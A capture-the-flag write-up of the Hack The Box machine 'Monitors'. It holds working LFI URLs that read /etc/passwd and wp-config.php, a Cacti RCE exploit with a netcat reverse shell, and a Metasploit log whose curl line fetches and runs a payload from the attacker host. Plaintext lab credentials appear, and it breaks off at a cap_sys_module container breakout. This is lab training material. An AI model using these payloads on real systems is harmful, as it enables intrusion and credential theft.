## ---------->> Monitors <<------------

// We start with nmap scan 

    $ nmap -sV -A -Pn -T4 10.10.10.238 -p-
-----

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-07 14:05 UTC
    Stats: 0:01:57 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 6.94% done; ETC: 14:33 (0:25:55 remaining)
    Nmap scan report for 10.10.10.238
    Host is up (0.33s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
    |   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
    |_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

// Navigating to http://10.10.10.238/ , we can see that the output tells us that we not permmited and contact the admin's mail 

// the mail have the domain after the '@' 

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/1.png)

// So lets had him to /etc/hosts

    $ cat /etc/hosts

    10.10.10.238	monitors.htb

// Navigate to http://monitors.htb present us with some monitor site

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/2.png)

// [Feroxbuster](https://github.com/epi052/feroxbuster)(By epi052) Tool will help us to search for directories in the webssite

    $ ./feroxbuster -u http://monitors.htb/ -t 100
-----
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://monitors.htb/
     🚀  Threads               │ 100
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.1
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    301        9l       28w      317c http://monitors.htb/wp-content
    301        9l       28w      324c http://monitors.htb/wp-content/themes
    301        9l       28w      325c http://monitors.htb/wp-content/plugins
    301        9l       28w      327c http://monitors.htb/wp-content/languages
    301        9l       28w      335c http://monitors.htb/wp-content/languages/plugins
    301        9l       28w      334c http://monitors.htb/wp-content/languages/themes
    301        9l       28w      315c http://monitors.htb/wp-admin
    301        9l       28w      325c http://monitors.htb/wp-content/upgrade
    301        9l       28w      322c http://monitors.htb/wp-admin/images
    301        9l       28w      318c http://monitors.htb/wp-admin/js
    301        9l       28w      319c http://monitors.htb/wp-admin/css
    301        9l       28w      324c http://monitors.htb/wp-admin/includes
    301        9l       28w      320c http://monitors.htb/wp-admin/user


// The output tells us that the server CMS is WordPress

// We can check for vulnerabilities for Wordpress with [wpscan](https://wpscan.com/) tool

    $ wpscan --url http://monitors.htb/ --api-token YOUR_TOKEN --plugins-detection mixed -e
-------

        _______________________________________________________________
                 __          _______   _____
                 \ \        / /  __ \ / ____|
                  \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
                   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                    \  /\  /  | |     ____) | (__| (_| | | | |
                     \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                 WordPress Security Scanner by the WPScan Team
                                 Version 3.8.18
               Sponsored by Automattic - https://automattic.com/
               @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
        _______________________________________________________________

        ......

        [+] wp-with-spritz
         | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
         | Latest Version: 1.0 (up to date)
         | Last Updated: 2015-08-20T20:15:00.000Z
         | Readme: http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
         | [!] Directory listing is enabled
         |
         | Found By: Urls In Homepage (Passive Detection)
         | Confirmed By: Known Locations (Aggressive Detection)
         |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/, status: 200
         |
         | [!] 1 vulnerability identified:
         |
         | [!] Title: WP with Spritz 1.0 - Unauthenticated File Inclusion
         |     References:
         |      - https://wpscan.com/vulnerability/cdd8b32a-b424-4548-a801-bbacbaad23f8
         |      - https://www.exploit-db.com/exploits/44544/
         |
         | Version: 4.2.4 (80% confidence)
         | Found By: Readme - Stable Tag (Aggressive Detection)
         |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt

        ......

// The output of wpscan shows us there is vulnerability of wp-spritz plugin - Unauthenticated File Inclusion

// Navigating to https://www.exploit-db.com/exploits/44544/ will help us to understant 

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/3.png)

// Lets try that

    http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd
    
![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/4.png)

// It worked !

// We can check for WordPress configuration file calle 'wp-config.php'

    http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/5.png)

// We got Credentials !  wpadmin : BestAdministrator@2020!

// Trying to connect to Wordpress with those credentials didnt work

// So, Since we got successed with the LFI lets try to find some interesting files

// First we need linux directories list, found amazing [lfi-linux-list](https://github.com/carlospolop/hacktricks/blob/a140aa95ee5b53aa4c367cd6d8c5cb96d50dc381/pentesting-web/file-inclusion/lfi-linux-list.md
)(By carlospolop)

// Next we will proceed with the LFI and BurpSuite Intruder and Brute Force the directories to see the responses

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/6.png)

// We found interesting document in /etc/apache2/sites-enabled/000-default.conf

// Its the apache2 configuration file and he contains a sub domain we need to add to /etc/hosts

    $ cat /etc/hosts

    10.10.10.238	monitors.htb cacti-admin.monitors.htb
    
// Navigating to http://cacti-admin.monitors.htb we represented with login page 

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/7.png)

// success login with credentials:  admin : BestAdministrator@2020!

// on dashboard page we can see the version is 1.2.12

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/8.png)

// Lets search for vulnerabilities in [ExploiDB](https://www.exploit-db.com/)

![Image 9](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Monitors/9.png)

// Found a python script for Remote Code Execution(By Leonardo paiva)

// Lets download the Exploit and try him (First open listiner with nc)

    $ rlwrap nc -lvnp 1445
------

    $ python3 49810_2.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.17.8 --lport 1445
------

        [+] Connecting to the server...
        [+] Retrieving CSRF token...
        [+] Got CSRF token: sid:c2762d0e088a56b82b0489e3372a0c2710524339,1628527257
        [+] Trying to log in...
        [+] Successfully logged in!

        [+] SQL Injection:
        "name","hex"
        "",""
        "admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
        "sqli","43e9a4ab75570f5b"
        [+] Check your nc listener!
        
// What happends Behind the sins with BurpSuite

![Image 11]()

// We got a shell !!

        $ rlwrap nc -lvnp 1445
        listening on [any] 1445 ...
        connect to [10.10.17.8] from (UNKNOWN) [10.10.10.238] 51378
        /bin/sh: 0: can't access tty; job control turned off
        $ whoami
        www-data


// Get a better shell

    $ SHELL=/bin/bash script -q /dev/null
------

    www-data@monitors:/usr/share/cacti/cacti$ 

// After some search we found user name 'marcus'

// we can search the files assosiate with this user name

    www-data@monitors:$ grep 'marcus' /etc -R 2>/dev/null
--------

        ...
        /etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
        ...
// We do not have parmissions in /home/marcus/.backup/ directory,

// But we can try to see with 'cat' the backup,sh content

    www-data@monitors:$ cat /home/marcus/.backup/backup.sh
-----

#!/bin/bash

    backup_name="cacti_backup"
    config_pass="VerticalEdge2020"

    zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
    sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
    rm /tmp/${backup_name}.zip

// And we have marcus password ! 'VerticalEdge2020'

// We can try connect via SSH with user 'marcus'

    $ ssh marcus@10.10.10.238
---------

    marcus@monitors:~$ id
    uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)

// And we got user flag !

    marcus@monitors:~$ cat user.txt
    6db3c74d05...................

// There is a 'note.txt' with the user flag

    marcus@monitors:~$ ls
    note.txt  user.txt

    marcus@monitors:~$ cat note.txt 
------

    TODO:

    Disable phpinfo	in php.ini		- DONE
    Update docker image for production use	- 
    marcus@monitors:~$ 


// The note talking about docker update

// So lets check listening ports

    marcus@monitors:~$ netstat -tulnp
------

    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
    tcp6       0      0 :::80                   :::*                    LISTEN      -                   
    tcp6       0      0 :::22                   :::*                    LISTEN      -                   
    udp        0      0 0.0.0.0:36731           0.0.0.0:*                           -                   
    udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
    udp        0      0 127.0.0.1:161           0.0.0.0:*                           - 

// 127.0.0.1:8443 , We can make SSH tunneling of this port

    $ ssh -L 8443:127.0.0.1:8443 -R 4444:127.0.0.1:4444 -R 8080:127.0.0.1:8080 marcus@10.10.10.238

// Navigating to https://127.0.0.1:8443

![Image 10]()

// We can see Tomcat version, searching for vulnerabilities ther is [one](https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialiation/) match to the version

// Lets run msfconsole and try it

    msf6> use exploit/linux/http/apache_ofbiz_deserialization
-----

    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set forceexploit true
    forceexploit => true
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set payload linux/x86/shell/reverse_tcp
    payload => linux/x86/shell/reverse_tcp
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set lhost 10.10.17.8
    lhost => 10.10.17.8
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set rhosts 127.0.0.1
    rhosts => 127.0.0.1
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set lport 1444
    lport => 1444
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set forceexploit true
    forceexploit => true
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set srvhost 10.10.17.8
    srvhost => 10.10.17.8
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set srvport 1446
    srvport => 1446
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > run

    [*] Started reverse TCP handler on 10.10.17.8:1444 
    [*] Running automatic check ("set AutoCheck false" to disable)
    [!] The target is not exploitable. Target cannot deserialize arbitrary data. ForceExploit is enabled, proceeding with exploitation.
    [*] Executing Linux Dropper for linux/x86/shell/reverse_tcp
    [*] Using URL: http://10.10.17.8:1446/2U8klZ7F5Nq5La
    [+] Successfully executed command: curl -so /tmp/uMeklgXt http://10.10.17.8:1446/2U8klZ7F5Nq5La;chmod +x /tmp/uMeklgXt;/tmp/uMeklgXt;rm -f /tmp/uMeklgXt
    [*] Command Stager progress - 100.00% done (117/117 bytes)
    [*] Client 10.10.10.238 (curl/7.64.0) requested /2U8klZ7F5Nq5La
    [*] Sending payload to 10.10.10.238 (curl/7.64.0)
    [*] Sending stage (36 bytes) to 10.10.10.238
    [*] Command shell session 1 opened (10.10.17.8:1444 -> 10.10.10.238:60226) at 2021-08-09 17:22:10 +0000
    [*] Server stopped.
    
// And we got root

    id
    uid=0(root) gid=0(root) groups=0(root)

// Promote shell 

    SHELL=/bin/bash script -q /dev/null
    
// And we can see that we root in docker container

    root@d88794475b77:#

// For breake out of the container we can use the capabillities of 'cap_sys_module'

// First lets check if its exist

    root@d88794475b77:/root# capsh --print
    capsh --print
    Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
    Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
    Securebits: 00/0x0/1'b0
     secure-noroot: no (unlocked)
     secure-no-suid-fixup: no (unlocked)
     secure-keep-caps: no (unlocked)
    uid=0(root)
    gid=0(root)
    groups=

// Its there! Following the [guide](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=11de0916be3c)


